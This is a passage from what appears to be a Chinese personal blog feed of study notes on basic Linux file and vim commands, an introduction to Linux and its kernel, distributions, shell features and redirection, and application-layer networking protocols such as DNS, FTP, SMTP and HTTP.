    <content type="html"><![CDATA[<h1 id="Liunx——文件命令操作"><a href="#Liunx——文件命令操作" class="headerlink" title="Liunx——文件命令操作"></a>Liunx——文件命令操作</h1><h4 id="1-Linux——ls命令"><a href="#1-Linux——ls命令" class="headerlink" title="1.Linux——ls命令"></a>1.Linux——ls命令</h4><ul><li><h5 id="pwd："><a href="#pwd：" class="headerlink" title="pwd："></a>pwd：</h5><p>查看当前所处的路径</p></li></ul><center><img src="/img/Liunx%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%93%8D%E4%BD%9C/1.png" style="zoom:80%;" /></center><ul><li><h5 id="cmp-–help："><a href="#cmp-–help：" class="headerlink" title="cmp –help："></a>cmp –help：</h5><p>查看命令的帮助手册</p></li></ul><center><img src="/img/Liunx%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%93%8D%E4%BD%9C/2.png" style="zoom:80%;" /></center><ul><li><h5 id="ls："><a href="#ls：" class="headerlink" title="ls："></a>ls：</h5><p>查看当前路径下所有文件</p></li></ul><center><img src="/img/Liunx%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%93%8D%E4%BD%9C/3.png" style="zoom:80%;" /></center><ul><li><h5 id="ls-l："><a href="#ls-l：" class="headerlink" title="ls -l："></a>ls -l：</h5><p>列表形式显示文件夹</p></li></ul><center><img src="/img/Liunx%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%93%8D%E4%BD%9C/4.png" style="zoom:80%;" /></center><ul><li><h5 id="ls-a："><a href="#ls-a：" class="headerlink" title="ls -a："></a>ls -a：</h5><p>显示隐藏文件夹</p></li></ul><center><img src="/img/Liunx%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%93%8D%E4%BD%9C/5.png" style="zoom:80%;" /></center><ul><li><h5 id="ls-txt："><a href="#ls-txt：" class="headerlink" title="ls .txt："></a>ls .txt：</h5><p>把当前目录的txt文件列出来</p></li></ul><p>&emsp;</p><h4 id="2-Linux——cd命令"><a href="#2-Linux——cd命令" class="headerlink" title="2.Linux——cd命令"></a>2.Linux——cd命令</h4><ul><li><h5 id="cd："><a href="#cd：" class="headerlink" title="cd："></a>cd：</h5><p>打开/切换 目录或者路径</p></li><li><h5 id="cd-wwww："><a href="#cd-wwww：" class="headerlink" title="cd wwww："></a>cd wwww：</h5><p>到某某目录</p></li><li><h5 id="cd-："><a href="#cd-：" class="headerlink" title="cd  ..："></a>cd  ..：</h5><p>到上一级的目录</p></li><li><h5 id="cd-：-1"><a href="#cd-：-1" class="headerlink" title="cd - ："></a>cd - ：</h5><p>意思是返回到上次的目录，类似windows返回 ；</p></li><li><h5 id="cd-：-2"><a href="#cd-：-2" class="headerlink" title="cd /："></a>cd /：</h5><p>意思是回到根目录。</p></li><li><h5 id="cd-～："><a href="#cd-～：" class="headerlink" title="cd ～："></a>cd ～：</h5><p>返回到home目录</p></li></ul><center><img src="/img/Liunx%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%93%8D%E4%BD%9C/7.png" style="zoom:80%;" /></center><p>&emsp;&emsp;</p><h4 id="3-Linux——vim命令"><a href="#3-Linux——vim命令" class="headerlink" title="3.Linux——vim命令"></a>3.Linux——vim命令</h4><ul><li><h5 id="vim-filename："><a href="#vim-filename：" class="headerlink" title="vim filename："></a>vim filename：</h5><p>打开或新建文件夹，并将光标置于第一行首</p></li><li><h5 id="vim-n-filename："><a href="#vim-n-filename：" class="headerlink" title="vim +n filename："></a>vim +n filename：</h5><p>打开文件，并将光标置于第n行首</p></li><li><h5 id="vim-filename：-1"><a href="#vim-filename：-1" class="headerlink" title="vim + filename："></a>vim + filename：</h5><p>打开文件，并将光标置于最后一行首</p></li><li><h5 id="vim-pattern-filename："><a href="#vim-pattern-filename：" class="headerlink" title="vim +/pattern filename："></a>vim +/pattern filename：</h5><p>打开问价你，并将光标置于第一个与pattern匹配的串处</p></li><li><h5 id="vim-r-filename："><a href="#vim-r-filename：" class="headerlink" title="vim -r filename："></a>vim -r filename：</h5><p>在上传真用vi编辑时封神系统崩溃，恢复filename</p></li><li><h5 id="vim-filename…filename："><a href="#vim-filename…filename：" class="headerlink" title="vim filename…filename："></a>vim filename…filename：</h5><p>打开多个文件，依次进行编辑</p></li><li><h5 id="Tab："><a href="#Tab：" class="headerlink" title="Tab："></a>Tab：</h5><p>自动补全</p></li></ul><p>&emsp;</p><h4 id="4-Linux——文件命令"><a href="#4-Linux——文件命令" class="headerlink" title="4.Linux——文件命令"></a>4.Linux——文件命令</h4><ul><li><h5 id="文件创建"><a href="#文件创建" class="headerlink" title="文件创建"></a>文件创建</h5><ol><li><h6 id="touch-test-txt："><a href="#touch-test-txt：" class="headerlink" title="touch test.txt："></a>touch test.txt：</h6><p>在当下目录创建test.txt文件</p></li><li><h6 id="touch-test-txt：-1"><a href="#touch-test-txt：-1" class="headerlink" title="touch .test.txt："></a>touch .test.txt：</h6><p>创建test.txt隐藏文件，其中.代表隐藏文件</p></li><li><h6 id="mkdir-xx："><a href="#mkdir-xx：" class="headerlink" title="mkdir xx："></a>mkdir xx：</h6><p>在当前目录创建xx文件夹</p></li></ol></li><li><h5 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h5><ol><li><h6 id="rm-test-txt："><a href="#rm-test-txt：" class="headerlink" title="rm test.txt："></a>rm test.txt：</h6><p>删除当前目录下的test.txt文件</p></li><li><h6 id="rm-d-xx："><a href="#rm-d-xx：" class="headerlink" title="rm -d xx："></a>rm -d xx：</h6><p>删除当前目录下的xx文件夹</p></li><li><h6 id="rm-r-xx："><a href="#rm-r-xx：" class="headerlink" title="rm -r xx："></a>rm -r xx：</h6><p>删除当前目录下的xx文件夹</p></li></ol></li><li><h5 id="文件移动"><a href="#文件移动" class="headerlink" title="文件移动"></a>文件移动</h5><ol><li><h6 id="mv-test-txt-xx："><a href="#mv-test-txt-xx：" class="headerlink" title="mv test.txt xx："></a>mv test.txt xx：</h6><p>将test.txt文件移动到xx文件夹中，其实是剪贴</p></li><li><h6 id="mv-1-txt-2-txt"><a href="#mv-1-txt-2-txt" class="headerlink" title="mv 1.txt ./2.txt"></a>mv 1.txt ./2.txt</h6><p>实际是将1文件重新命名为了2文件</p></li></ol></li><li><h5 id="文件查看"><a href="#文件查看" class="headerlink" title="文件查看"></a>文件查看</h5><ol><li><h6 id="cat-xx："><a href="#cat-xx：" class="headerlink" title="cat xx："></a>cat xx：</h6><p>xx文件的内容全部显示出来</p></li></ol></li></ul><p>&emsp;</p><h4 id="5-Linux——文本命令"><a href="#5-Linux——文本命令" class="headerlink" title="5.Linux——文本命令"></a>5.Linux——文本命令</h4><ul><li><h5 id="wq"><a href="#wq" class="headerlink" title=":wq"></a>:wq</h5><p>保存并退出vim编辑器</p></li><li><h5 id="wq-1"><a href="#wq-1" class="headerlink" title=":wq!"></a>:wq!</h5><p>保存并强制退出vim编辑器</p></li><li><h5 id="q"><a href="#q" class="headerlink" title=":q"></a>:q</h5><p>不保存就退出vim编辑器</p></li><li><h5 id="q-1"><a href="#q-1" class="headerlink" title=":q!"></a>:q!</h5><p>不保存，且强制退出vim编辑器</p></li><li><h5 id="w"><a href="#w" class="headerlink" title=":w"></a>:w</h5><p>保存但不退出vim编辑器</p></li><li><h5 id="w-1"><a href="#w-1" class="headerlink" title=":w!"></a>:w!</h5><p>强制保存文本</p></li><li><h5 id="w-filename"><a href="#w-filename" class="headerlink" title=":w filename"></a>:w filename</h5><p>另存到filename文件中</p></li><li><h5 id="x"><a href="#x" class="headerlink" title="x!"></a>x!</h5><p>保存文本，并退出vim编辑器，更通用的一个vim命令</p></li><li><h5 id="ZZ"><a href="#ZZ" class="headerlink" title="ZZ"></a>ZZ</h5><p>直接退出vim编辑器</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux——操作系统介绍</title>
    <link href="/2023/01/01/Linux%E2%80%94%E2%80%94%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BB%8B%E7%BB%8D/"/>
    <url>/2023/01/01/Linux%E2%80%94%E2%80%94%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BB%8B%E7%BB%8D/</url>
    
    <content type="html"><![CDATA[<h1 id="Linux——操作系统介绍"><a href="#Linux——操作系统介绍" class="headerlink" title="Linux——操作系统介绍"></a>Linux——操作系统介绍</h1><h4 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h4><p>&emsp;&emsp;其实我用Linux使用的比较少，可以说除了老师作业基本不怎么玩Linux系统，但是在面试某个的面试官问我Linux系统的东西时间，我懵逼了，所以我觉得有必要学习Linux的相关知识和体系</p><p>&emsp;</p><h4 id="1-操作系统简史"><a href="#1-操作系统简史" class="headerlink" title="1.操作系统简史"></a>1.操作系统简史</h4><p>&emsp;&emsp;1946年2月，美国宾夕法尼亚大学诞生了第一台电子计算机，这款计算机由大量的电子管构成，体型十分的庞大。在最开始的计算机最后并没有操作系统的概念，计算机采用手工操作，程序员将对应程序和数据的打孔纸带装入输入机器当中，然后启动输入机器将程序和数据输入计算机内存最后控制运行计算结果，完成后要取下纸带才能让下一个用户使用。</p><p>&emsp;&emsp;这种方式的缺点很明显，用户独占全机，系统资源的利用效率十分低下，计算机只能单用户单任务的执行操作，中途也无法暂停。为了解决这种问题，操作系统的概念由此出现，从批处理系统、多道程序系统、分时系统到最后的实时系统不断根据时代的需求向前发展</p><center><img src="/img/Linux%E2%80%94%E2%80%94%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BB%8B%E7%BB%8D/1.png" style="zoom:60%;" /></center><p>&emsp;</p><h4 id="2-Linux的诞生与分支"><a href="#2-Linux的诞生与分支" class="headerlink" title="2.Linux的诞生与分支"></a>2.Linux的诞生与分支</h4><p>&emsp;&emsp;在计算机的硬件发展中，随着使用的人数增加带来了巨大的利益，发明UNIX的AT&amp;T收回了相应的版权，大家无法免费使用Unix，大学也不能将Unix源码作为教材教导学生，新的开源免费操作系统迫在眉睫。</p><p>&emsp;&emsp;首先是Andrew S. Tanenbaum在Unix源码不开源的条件下，写出了另一个的操作系统Minix（mini—Unix），最后由Linus Torvalds研究Minix并在此基础上开发，最终写出了玩具版的操作系统Linux，自此以后，世界上第一款Linux操作系统诞生了。由于其开源和免费的理念，吸引了许多的电脑高手投入到了开发、改善、发展的Linux历史之中，最终演变成如今强大的Linux系统。</p><center><img src="/img/Linux%E2%80%94%E2%80%94%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BB%8B%E7%BB%8D/2.png" style="zoom:80%;" /></center><p>&emsp;&emsp;Linux系统发行版流派众多。目前有Red Hat、Debian、Suse、Ubuntu等发行版本，它们都使用Linux内核，都是Linux系统，却有各自的特点。总体来说，Linux的发行版本大体分可为两类，一类是商业公司维护的发行版本，一类是社区组织维护的发行版本。前者以Redhat（RHEL）为代表，后者以Debian为代表。</p><p>&emsp;</p><h4 id="3-Linux内核和发行版"><a href="#3-Linux内核和发行版" class="headerlink" title="3.Linux内核和发行版"></a>3.Linux内核和发行版</h4><p>&emsp;&emsp;Linux的内核和发行版并不是一个概念：</p><ul><li>Linux内核：Linux内核是Linus领导的开发小组负责维护，版本唯一，提供硬件抽象层、硬盘、文件系统控制以及多任务功能的系统核心程序。作为系统的心脏，运行程序和管理像磁盘和打印机等硬件设备的核心程序</li><li>Linux发行版：Linux发行版就是由Linux内核与工作常用软件的集合产品。不同标准将Linux发行版进行了不同性质的分类，比如根据社区维护还是商业公司维护，Linux发行版本分为了三个分支===》Redhat家族、Debian家族以及ShackWare家族</li></ul><p>&emsp;&emsp;总的来说，Linux核心只有内核部分，安装好内核后，是没有所谓的用户界面和软件的，内核可以作为是Linux最基层的代码，而Linux发行版，是在内核的基础上，加入用户界面，软件支持，以内核为基础，开发不同应用的程序，组成完整的操作系统。</p><p>&emsp;</p><h4 id="4-Linux系统结构"><a href="#4-Linux系统结构" class="headerlink" title="4.Linux系统结构"></a>4.Linux系统结构</h4><p>&emsp;&emsp;Linux系统的内部结构一般而言主要分为四个部分：内核、shell、文件系统和应用程序。前三者构成了基本的操作系统结构，使得用户能够运行程序、管理文件和使用系统。</p><ul><li><p>内核：</p><p>操作系统核心，负责管理系统的进程、内存、设备驱动程序等等，决定着系统的性能和稳定性</p></li><li><p>shell：</p><p>shell是系统的用户界面，提供了用户与内核进行交互的一种接口，它接收用户输入端命令并把它送入内核去执行，是一种命令解释器。由于shell编程语言具有普通编程语言的很多特点，用这种编程语言编写的shell程序与其他应用程序具有相同的效果</p></li><li><p>文件系统：</p><p>文件系统就是文件存放在磁盘等存储设备上的组织方法</p></li><li><p>应用程序</p><p>标准的Linux系统一般都有一套称为应用程序的程序集合，包括了文本编辑器、编程语言、X Window、办公套件、数据库等</p></li></ul><p>&emsp;</p><h4 id="5-Linux帮助命令"><a href="#5-Linux帮助命令" class="headerlink" title="5.Linux帮助命令"></a>5.Linux帮助命令</h4><p>&emsp;&emsp;Linux下常用的帮助命令有man和help，当需要查询一些命令或函数的具体使用方法时，就可以使用man，主要输入命令man后输入想要获取的命令别称，man就会列出一份完整的锁门，其中内容包括命令语法、各选项的意义以及相关命令等等</p><ul><li>man命令选项说明表</li></ul><table><thead><tr><th align="center">选项</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">-f</td><td align="center">只显示出命令的功能而不显示其中详细的说明文件</td></tr><tr><td align="center">-w</td><td align="center">不显示手册页，只显示将被格式化和显示的文件所在位置</td></tr><tr><td align="center">-a</td><td align="center">显示所有的手册页，而不是只显示第一个</td></tr><tr><td align="center">-E</td><td align="center">在每行的末尾显示$符号</td></tr></tbody></table><p>&emsp;&emsp;help命令用于查看所有shell命令，用户可以通过该命令寻求shell命令的用法，只需在所查找的命令后输入help命令，就能查命令的内容了</p><center><img src="/img/Linux%E2%80%94%E2%80%94%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BB%8B%E7%BB%8D/3.png" style="zoom:60%;" /></center><p>&emsp;</p><h4 id="6-Linux常用快捷键和脚本命令"><a href="#6-Linux常用快捷键和脚本命令" class="headerlink" title="6.Linux常用快捷键和脚本命令"></a>6.Linux常用快捷键和脚本命令</h4><center><img src="/img/Linux%E2%80%94%E2%80%94%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BB%8B%E7%BB%8D/4.png" style="zoom:100%;" /></center><p>&emsp;&emsp;（图片来源：<a href="https://www.cnblogs.com/youngchaolin/p/10962049.html%EF%BC%89">https://www.cnblogs.com/youngchaolin/p/10962049.html）</a></p><p>&emsp;</p><h4 id="7-Linux别名配置"><a href="#7-Linux别名配置" class="headerlink" title="7.Linux别名配置"></a>7.Linux别名配置</h4><p>&emsp;&emsp;在Linux系统中有一个叫作alias的命令，它可以给一些命令设置别名。</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">alias</span>[<span class="hljs-keyword">name</span>[=value]]<br></code></pre></td></tr></table></figure><p>&emsp;&emsp;这里需要注意的是等号前后不能有空格，并且如果vakue中有空格或者tab，则value需要使用引号括起来</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir">[roc<span class="hljs-variable">@roclinux</span> ~]<span class="hljs-variable">$ </span><span class="hljs-keyword">alias</span> vi=<span class="hljs-string">&#x27;vim&#x27;</span><br><br>//查看别名<br>[roc<span class="hljs-variable">@roclinux</span> ~]<span class="hljs-variable">$ </span><span class="hljs-keyword">alias</span><br></code></pre></td></tr></table></figure><center><img src="/img/Linux%E2%80%94%E2%80%94%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BB%8B%E7%BB%8D/5.png" style="zoom:100%;" /></center><p>&emsp;&emsp;（<a href="http://c.biancheng.net/linux/alias.html%EF%BC%89">http://c.biancheng.net/linux/alias.html）</a></p><p>&emsp;</p><h4 id="8-Linux通配符"><a href="#8-Linux通配符" class="headerlink" title="8.Linux通配符"></a>8.Linux通配符</h4><p>&emsp;&emsp;Linux通配符是由shell解析，一般用于匹配问津名，实际上是shell解释器去解析的特殊符号，Linux系统通常的通配符主要有：</p><ul><li>*：匹配任意多个字符</li><li>?：匹配任意一个字符</li><li>[…]：匹配中括号内出现的任意一个字符</li><li>[!…]：不匹配中括号内出现的任意一个字符</li></ul><p>&emsp;</p><h4 id="9-Linux环境变量"><a href="#9-Linux环境变量" class="headerlink" title="9.Linux环境变量"></a>9.Linux环境变量</h4><p>&emsp;&emsp;在Linux系统中，环境变量是用来定义系统运行环境的一些参数，比如每个月用户不同的家的目录、邮件存放地址等。Linux的环境变量一般都是大写，算是约定俗成的规范。我们可以使用env来查看Linux系统中的所有环境变量：</p><center><img src="/img/Linux%E2%80%94%E2%80%94%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BB%8B%E7%BB%8D/6.png" style="zoom:100%;" /></center><p>&emsp;&emsp;Linux需要数百个环境变量来协同工作提供服务，又因为给每个用户提供独立的工作运行环境，一个相同的环境变量会因为用户身份的不同而具有不同的值。具体操作百度即可，我是觉得除特殊情况外，没必要记得清清楚楚。</p><p>&emsp;</p><h4 id="10-Linux文件描述符和重定向"><a href="#10-Linux文件描述符和重定向" class="headerlink" title="10.Linux文件描述符和重定向"></a>10.Linux文件描述符和重定向</h4><p>&emsp;&emsp;所谓的文件描述符设置与文件输入、输出相关的证书，在编写脚本时会经常使用标准的文件描述符来讲内容重定向输出，其中0、1、2是文件描述符（分别对应stdin、stdout、stderr），&lt; 、&gt;, &gt;&gt;叫做操作符：</p><ul><li><p>stdin(0):</p><p>标准输入，这个概念有点不太容易理解比如：1.使用&lt;从文件中读取内容，2.当前命令将内容通过管道传输给下一个命令而下一个命令，而实际内容是传输给了stdin所以下一个命令也是从stdin中读取内容</p></li><li><p>stdout(1)：</p><p>标准输出，这是默认选项。使用方法:1&gt;等价于&gt;  <strong>或者</strong> 1&gt;&gt;等价于&gt;&gt;，;如果想使用其它文件描述符，必须将文件描述符放在操作符之前</p></li><li><p>stderr(2):</p><p>标准错误，使用方法2&gt;或者2&gt;&gt;，标准错误可以将错误信息插入到文件而不在终端显示  。</p></li><li><p>&lt;:</p><p>从文件中读取内容</p></li><li><p>&gt;:</p><p>将内容插入到文件,每次插入前都会清空文件内容</p></li><li><p>&gt;&gt;:</p><p>将内容插入到文件, 将内容追加到现有文件的末尾</p></li></ul><center><img src="/img/Linux%E2%80%94%E2%80%94%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BB%8B%E7%BB%8D/7.png" style="zoom:100%;" /></center>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>应用层</title>
    <link href="/2022/12/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8D%81/"/>
    <url>/2022/12/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8D%81/</url>
    
    <content type="html"><![CDATA[<h1 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h1><h4 id="1-网络应用模型"><a href="#1-网络应用模型" class="headerlink" title="1.网络应用模型"></a>1.网络应用模型</h4><p>&emsp;&emsp;应用层对应用程序的通讯提供服务。</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8D%81/1.png" style="zoom:80%;" /></center><ul><li><h6 id="客户-服务器模型（Client-Server）"><a href="#客户-服务器模型（Client-Server）" class="headerlink" title="客户/服务器模型（Client/Server）"></a>客户/服务器模型（Client/Server）</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8D%81/2.png" style="zoom:80%;" /></center><ul><li><h6 id="P2P模型"><a href="#P2P模型" class="headerlink" title="P2P模型"></a>P2P模型</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8D%81/3.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="2-DNS域名解析系统"><a href="#2-DNS域名解析系统" class="headerlink" title="2.DNS域名解析系统"></a>2.DNS域名解析系统</h4><p>&emsp;&emsp;DNS服务的作用：将域名解析成IP地址</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8D%81/4.png" style="zoom:80%;" /></center><ul><li><h6 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8D%81/5.png" style="zoom:80%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8D%81/6.png" style="zoom:80%;" /></center><ul><li><h6 id="域名服务器"><a href="#域名服务器" class="headerlink" title="域名服务器"></a>域名服务器</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8D%81/7.png" style="zoom:80%;" /></center><p>&emsp;&emsp;本地域名服务器：当一个主机发出DNS查询请求时，这个查询请求报文就发给本地域名服务器</p><ul><li><h6 id="域名解析过程"><a href="#域名解析过程" class="headerlink" title="域名解析过程"></a>域名解析过程</h6></li></ul><p>&emsp;&emsp;在域名解析的过程中，查询分为两种，分别是递归查询和迭代查询</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8D%81/8.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="3-FTP文件传输协议"><a href="#3-FTP文件传输协议" class="headerlink" title="3.FTP文件传输协议"></a>3.FTP文件传输协议</h4><p>&emsp;&emsp;提供不同种类主机系统（硬、软件体系等都可以不同）之间的文件传输能力</p><ul><li><h6 id="FTP服务器和用户端"><a href="#FTP服务器和用户端" class="headerlink" title="FTP服务器和用户端"></a>FTP服务器和用户端</h6></li></ul><p>&emsp;&emsp;FTP是基于客户/服务器（C/S）的协议，用户通过一个客户机程序连接至在远程计算机上运行的服务器程序</p><p>&emsp;&emsp;依照FTP协议提供服务，解析文件传送的计算机就是FTP服务器，连接FTP服务器，遵循FTP协议与服务器传送文件的电脑就是FTP客户端</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8D%81/9.png" style="zoom:80%;" /></center><ul><li><h6 id="FTP工作原理"><a href="#FTP工作原理" class="headerlink" title="FTP工作原理"></a>FTP工作原理</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8D%81/10.png" style="zoom:80%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8D%81/11.png" style="zoom:80%;" /></center><ul><li><h6 id="FTP传输模式"><a href="#FTP传输模式" class="headerlink" title="FTP传输模式"></a>FTP传输模式</h6></li></ul><p>&emsp;&emsp;文本模式：ASCII模式，以文本序列传输数据</p><p>&emsp;&emsp;二进制模式：Binary模式，以二进制序列传输数据</p><p>&emsp;</p><h4 id="4-电子邮件"><a href="#4-电子邮件" class="headerlink" title="4.电子邮件"></a>4.电子邮件</h4><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8D%81/12.png" style="zoom:50%;" /></center><ul><li><h6 id="电子邮件的信息格式"><a href="#电子邮件的信息格式" class="headerlink" title="电子邮件的信息格式"></a>电子邮件的信息格式</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8D%81/13.png" style="zoom:80%;" /></center><ul><li><h6 id="电子邮件的组成结构"><a href="#电子邮件的组成结构" class="headerlink" title="电子邮件的组成结构"></a>电子邮件的组成结构</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8D%81/14.png" style="zoom:80%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8D%81/15.png" style="zoom:80%;" /></center><ul><li><h6 id="SMTP简单邮件传送协议"><a href="#SMTP简单邮件传送协议" class="headerlink" title="SMTP简单邮件传送协议"></a>SMTP简单邮件传送协议</h6></li></ul><p>&emsp;&emsp;SMTP规定了在两个相互通信的SMTP进程之间应如何交换信息；负责发送邮件的SMTP进程就是SMTP客户，负责接收邮件的进程就是SMTP服务器</p><p>&emsp;&emsp;SMTP规定了14条命令（几个字母）和21种应答信息（三位数字代码+简单文字说明）</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8D%81/16.png" style="zoom:80%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8D%81/17.png" style="zoom:80%;" /></center><ul><li><h6 id="MIME通用因特网邮件扩充"><a href="#MIME通用因特网邮件扩充" class="headerlink" title="MIME通用因特网邮件扩充"></a>MIME通用因特网邮件扩充</h6></li></ul><p>&emsp;&emsp;由于SMTP存在缺点：</p><p>&emsp;&emsp;1、SMTP不能传送可执行文件或者其他二进制对象</p><p>&emsp;&emsp;2、SMTP仅限于传送7位ASCII码，不能传送其他非英语国家的文字</p><p>&emsp;&emsp;3、SMTP服务器会拒绝超过一定长度的邮件</p><p>&emsp;&emsp;由于存在以上缺点诞生相关的辅助内容</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8D%81/18.png" style="zoom:80%;" /></center><ul><li><h6 id="POP3邮局协议"><a href="#POP3邮局协议" class="headerlink" title="POP3邮局协议"></a>POP3邮局协议</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8D%81/19.png" style="zoom:80%;" /></center><ul><li><h6 id="IMAP网际报文存取协议"><a href="#IMAP网际报文存取协议" class="headerlink" title="IMAP网际报文存取协议"></a>IMAP网际报文存取协议</h6></li></ul><p>&emsp;&emsp;IMAP协议比POP协议复杂。当用户Pc上的IMAP客户程序打开IMAP服务器的邮箱时，用户可以看到邮箱的首部， 若用户需要打开某个邮件，该邮件才上传到用户的计算机上</p><p>&emsp;&emsp;IMAP可以让用户在不同的地方使用不同的计算机随时上网阅读处理邮件，还允许只读取邮件中的某一个部分 （先看正文，有WiFi的时候再下载附件）</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8D%81/20.png" style="zoom:80%;" /></center><ul><li><h6 id="基于万维网的电子邮件"><a href="#基于万维网的电子邮件" class="headerlink" title="基于万维网的电子邮件"></a>基于万维网的电子邮件</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8D%81/21.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="5-万维网"><a href="#5-万维网" class="headerlink" title="5.万维网"></a>5.万维网</h4><p>&emsp;&emsp;万维网WWW（World Wide Web）是一个大规模的、联机式的信息储藏所/资料空间，是无数个网络站点和网页的集合</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8D%81/22.png" style="zoom:80%;" /></center><p>&emsp;&emsp;用户通过点击超链接（<a href="http://www.baidu.com)获取资源,这些资源通过超文本传输协议(http)传送给使用者/">http://www.baidu.com）获取资源，这些资源通过超文本传输协议（HTTP）传送给使用者</a></p><p>&emsp;&emsp;万维网以客户/服务器方式工作，用户使用的浏览器就是万维网客户程序，万维网文档所驻留的主机运行服务器程序</p><p>&emsp;&emsp;万维网使用超文本标记语言HTML，使得万维网页面设计者可以很方便地从一个界面的链接转到另一个界面，并能 够在自己的屏幕上显示出来</p><p>&emsp;</p><h4 id="6-HTTP超文本传输协议"><a href="#6-HTTP超文本传输协议" class="headerlink" title="6.HTTP超文本传输协议"></a>6.HTTP超文本传输协议</h4><p>&emsp;&emsp;HTTP协议定义了浏览器（万维网客户进程）怎样向万维网服务器请求万维网文档，以及服务器怎样把文档传送给浏览器</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8D%81/23.png" style="zoom:80%;" /></center><ul><li><h6 id="HTTP协议特点"><a href="#HTTP协议特点" class="headerlink" title="HTTP协议特点"></a>HTTP协议特点</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8D%81/24.png" style="zoom:80%;" /></center><ul><li><h6 id="HTTP的连接方式"><a href="#HTTP的连接方式" class="headerlink" title="HTTP的连接方式"></a>HTTP的连接方式</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8D%81/25.png" style="zoom:80%;" /></center><ul><li><h6 id="HTTP的报文结构"><a href="#HTTP的报文结构" class="headerlink" title="HTTP的报文结构"></a>HTTP的报文结构</h6></li></ul><center><img 